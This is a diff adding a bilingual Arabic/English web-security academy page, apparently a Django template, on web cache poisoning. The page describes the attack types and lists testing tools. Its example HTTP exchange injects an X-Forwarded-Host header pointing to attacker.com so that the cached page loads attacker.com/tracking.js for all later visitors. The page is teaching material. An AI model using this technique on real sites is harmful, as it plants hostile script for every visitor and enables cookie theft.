@@ -1,0 +1,92 @@
+{% extends "main/academy/base.html" %}
+
+{% block title %}Web Cache Poisoning — Poisoning the Masses{% endblock %}
+{% block meta_desc %}Web cache poisoning, HTTP headers, Cache Deception, and payloads in Arabic & English{% endblock %}
+
+{% block content %}
+<div class="page-hero">
+  <h1 class="page-title">تسميم الذاكرة المخبئية — تسميم الجماهير</h1>
+  <p class="page-title-en">Web Cache Poisoning — Poisoning the Masses</p>
+  <span class="severity-pill pill-high">HIGH</span>
+  <span class="severity-pill pill-medium">OWASP A06</span>
+</div>
+
+<div class="bilingual-block">
+  <div class="lang-section">
+    <span class="lang-tag">AR</span>
+    <p><strong>Web Cache Poisoning</strong> هي ثغرة متقدمة تحدث عندما يستطيع المهاجم التلاعب برؤوس الطلبات غير المحددة في مفتاح الذاكرة المخبئية (Unkeyed Headers) مثل <code>X-Forwarded-Host</code>، لجعل الخادم يولد استجابة ضارة ويقوم وسيط الـ Cache (مثل Cloudflare أو Akamai) بحفظها وتوزيعها لجميع الزوار اللاحقين.</p>
+  </div>
+  <div class="lang-section lang-en">
+    <span class="lang-tag">EN</span>
+    <p><strong>Web Cache Poisoning</strong> is an advanced vulnerability where an attacker manipulates unkeyed request headers (like <code>X-Forwarded-Host</code>) to force the server into caching a malicious response, which is then served by the CDNs (like Cloudflare or Akamai) to all subsequent users.</p>
+  </div>
+</div>
+
+<div class="section-card">
+  <h2>أنواع تسميم الكاش / Attack Types</h2>
+  <div class="type-grid">
+    <div class="type-item">
+      <h4>Basic Cache Poisoning</h4>
+      <p>التلاعب بالرؤوس (Headers) لحقن جافا سكريبت في الـ Cached page.</p>
+    </div>
+    <div class="type-item">
+      <h4>DOM-based Cache Poisoning</h4>
+      <p>التلاعب بالـ Unkeyed headers لتغيير المتغيرات التي تقرأها جافا سكريبت بالـ DOM.</p>
+    </div>
+    <div class="type-item">
+      <h4>Cache Deception</h4>
+      <p>خداع الـ Cache لحفظ ملفات المستخدمين الحساسة (مثل `/profile`) على أنها ملفات ثابتة (مثل `/profile.js`) لتسهيل قراءتها علناً.</p>
+    </div>
+  </div>
+</div>
+
+<div class="section-card">
+  <h2>أوامر واختبار الثغرة / Testing & HTTP Headers</h2>
+  <p>يتم اختبار الثغرة بإرسال ترويسات مخصصة غير مفهرسة (Unkeyed) ومراقبة ما إذا كانت تنعكس في الاستجابة ويتم إرسال ترويسة <code>X-Cache: HIT</code>:</p>
+  <div class="cmd-block">
+    <pre># طلب يحتوي على ترويسة خبيثة
+GET /index.html HTTP/1.1
+Host: target.com
+X-Forwarded-Host: attacker.com
+
+# الاستجابة المخزنة التي تحتوي على كود خبيث
+HTTP/1.1 200 OK
+X-Cache: MISS
+...
+&lt;script src="https://attacker.com/tracking.js"&gt;&lt;/script&gt;
+
+# عند إعادة إرسال الطلب بدون الترويسة الخبيثة، تعود نفس الاستجابة المخزنة
+GET /index.html HTTP/1.1
+Host: target.com
+
+HTTP/1.1 200 OK
+X-Cache: HIT
+...
+&lt;script src="https://attacker.com/tracking.js"&gt;&lt;/script&gt;</pre>
+    <div class="cmd-footer"><button class="copy-btn" onclick="copyCmd(this)">📋 Copy</button></div>
+  </div>
+</div>
+
+<div class="section-card">
+  <h2>الأدوات / Tools</h2>
+  <div class="tools-row">
+    <span class="tool-chip">Param Miner (Burp Suite Extension)</span>
+    <span class="tool-chip">toxicache</span>
+    <span class="tool-chip">Burp Suite Repeater</span>
+  </div>
+</div>
+
+<div class="section-card">
+  <h2>Writeup</h2>
+  <div class="bilingual-block">
+    <div class="lang-section">
+      <span class="lang-tag">AR</span>
+      <p>Writeup: <strong>Web Cache Poisoning: Poisoning the Masses</strong> — كيف استطاع الباحث جيمس كيتل حقن كود XSS في الصفحة الرئيسية لشركة كبرى وسرقة كوكيز آلاف المستخدمين دفعة واحدة عبر الكاش.</p>
+    </div>
+    <div class="lang-section lang-en">
+      <span class="lang-tag">EN</span>
+      <p>Writeup: <strong>Web Cache Poisoning: Poisoning the Masses</strong> — James Kettle's legendary research on mass user compromise using unkeyed header injections.</p>
+    </div>
+  </div>
+</div>
+{% endblock %}
